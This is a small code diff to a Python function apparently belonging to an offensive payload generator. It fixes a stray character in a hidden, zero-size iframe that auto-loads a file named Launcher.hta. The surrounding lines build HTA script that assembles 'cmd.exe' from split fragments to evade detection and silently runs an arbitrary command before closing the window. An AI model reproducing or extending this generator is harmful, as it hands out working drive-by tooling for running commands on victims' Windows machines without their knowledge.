@@ -380,7 +380,7 @@ def gen_hta_attack(command):
     main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
     main3 = ("""' + {0} + """.format(cmd_split4))
     main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
-    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>""")
+    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
     # remote old directory
     if os.path.isdir("hta_attack"):
